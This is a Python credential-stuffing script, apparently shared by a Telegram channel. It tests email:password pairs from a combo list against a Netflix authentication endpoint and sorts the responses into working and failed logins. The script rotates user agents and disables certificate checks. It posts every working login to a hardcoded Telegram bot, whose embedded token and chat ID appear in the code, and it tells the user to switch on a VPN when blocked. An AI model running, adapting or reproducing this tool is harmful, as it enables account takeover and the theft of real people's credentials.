import os,time,random
try:
     from getuseragent import UserAgent
except ModuleNotFoundError:
	print("- 𝐌𝐎𝐃𝐔𝐋𝐄 𝐄𝐑𝐑𝐎𝐑 ")
	os.system('pip install getuseragent')
	
try:
     import requests
except ModuleNotFoundError:
	print("- 𝐌𝐎𝐃𝐔𝐋𝐄 𝐄𝐑𝐑𝐎𝐑 ")
	os.system('pip install requests')
try:
	import requests
except ModuleNotFoundError:
	print("- 𝐌𝐎𝐃𝐔𝐋𝐄 𝐄𝐑𝐑𝐎𝐑 ")
	os.system('pip install requests')
try:
	from user_agent import generate_user_agent
except ModuleNotFoundError:
	print("- 𝐌𝐎𝐃𝐔𝐋𝐄 𝐄𝐑𝐑𝐎𝐑 ")
	os.system('pip install user_agent')
	
try:
	from cfonts import render  
except ModuleNotFoundError:
	print("- 𝐌𝐎𝐃𝐔𝐋𝐄 𝐄𝐑𝐑𝐎𝐑 ")
	os.system('pip install python-cfonts')
	from cfonts import render  

from getuseragent import UserAgent
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from user_agent import generate_user_agent


md1 = '\x1b[1;31m' 
md2 = '\x1b[1;32m' 
a6 = '\x1b[38;5;5m'

r=requests.Session()
os.system('clear')
output = render('R4X', colors=['white', 'magenta'], align='center')
print(output)

print(" 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 •@IM4REX • 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 • @R4X_METHOD ")
print("\x1b[38;5;5m—" * 72)
print('\n')

ID= "6418195079"
tok= "7096521801:AAHua0nUQv0OgXvcodPRPOhKSDhBEZAK-mQ"
file=input(f'{a6}𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐂𝐎𝐌𝐁𝐎 𝐋𝐈𝐒𝐓 -> ')
print("\x1b[38;5;5m—" * 72)

while True:
  for modca in open(file,'r').read().splitlines():
   MODCA2 = str(modca)
   ema = MODCA2.split(':')[0]
   password = MODCA2.split(':')[1]
   email = ema.split("@")[0]
   time.sleep(2)
   url = 'https://api-global.netflix.com/account/auth'
   
   headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'api-global.netflix.com',
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': UserAgent("ios").Random(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9'
}

   data = f'email={email}&password={password}&setCookies=true'
   
   MODCA = r.post(url, headers=headers, data=data, verify=False).text
  
   if "CURRENT_MEMBER" in MODCA or "member" in MODCA or "success" in MODCA:
            print(f'{md2}𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗛𝗜𝗧 -> {ema} | {password}')
            tlg =requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.
⋘─────━𓆩𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗛𝗜𝗧𓆪━─────⋙ 

𝗘𝗠𝗔𝗜𝗟 • {ema}
𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 • {password}

⋘──────━𓆩 𝗜𝗠𝟰𝗥𝗘𝗫 𓆪━──────⋙
''')
   elif '"FORMER_MEMBER"' in MODCA:
            print(f'{md1}𝐖𝐑𝐎𝐍𝐆 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 -> {ema} | {password}')
            
   elif 'never_member_consumption_only' in MODCA:
            print(f'{md2}𝐅𝐑𝐄𝐄 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 -> {ema} | {password}')
            tlg =requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=
⋘─────━𓆩𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗛𝗜𝗧𓆪━─────⋙ 

𝗘𝗠𝗔𝗜𝗟 • {ema}
𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 • {password}

⋘──────━𓆩 𝗜𝗠𝟰𝗥𝗘𝗫 𓆪━──────⋙
''') 
                       
   elif 'unrecognized_email' in MODCA:
            print(f'{md1}𝐖𝐑𝐎𝐍𝐆 𝐄𝐌𝐈𝐀𝐋 -> {ema} | {password}')
            
   elif 'NetflixId":null,"user":{' in MODCA:
   	 print(f'{md1}𝐖𝐑𝐎𝐍𝐆 𝐔𝐒𝐄𝐑 -> {ema} | {password}')
   	 
   elif 'Missing password' in MODCA:
   	 print(f'{md1}𝐌𝐈𝐒𝐒𝐈𝐍𝐆 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 -> {ema} | {password}')
   	 
   elif 'Incorrect email address or password' in MODCA:
   	print(f"{md1}𝐈𝐍𝐂𝐎𝐑𝐑𝐄𝐂𝐓 𝐄𝐌𝐀𝐈𝐋 𝐀𝐃𝐃𝐑𝐄𝐒𝐒 𝐎𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 -> {ema} | {password} ")
   else:
            print(f'{md1}𝐈𝐏 𝐁𝐋𝐎𝐂𝐊 𝐓𝐔𝐑𝐍 𝐎𝐍 𝐕𝐏𝐍')
            time.sleep(3600)